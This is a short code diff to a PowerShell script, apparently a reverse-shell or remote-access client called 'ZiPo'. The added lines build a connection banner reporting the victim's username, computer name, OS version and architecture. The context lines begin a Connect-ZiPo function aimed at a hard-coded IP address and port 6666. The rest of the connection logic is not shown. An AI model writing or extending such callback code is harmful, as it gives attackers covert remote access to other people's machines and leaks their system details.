@@ -1,3 +1,17 @@
+$msg = @"
+[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+    ________  .__              __________                .___           
+    \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
+     |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
+     |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
+    /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
+            \/        \/\/                                      \/    \/ 
+
+OS: $([System.Environment]::OSVersion.VersionString)
+Architecture: $env:PROCESSOR_ARCHITECTURE
+---------------------------------------------------
+"@
+
 function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
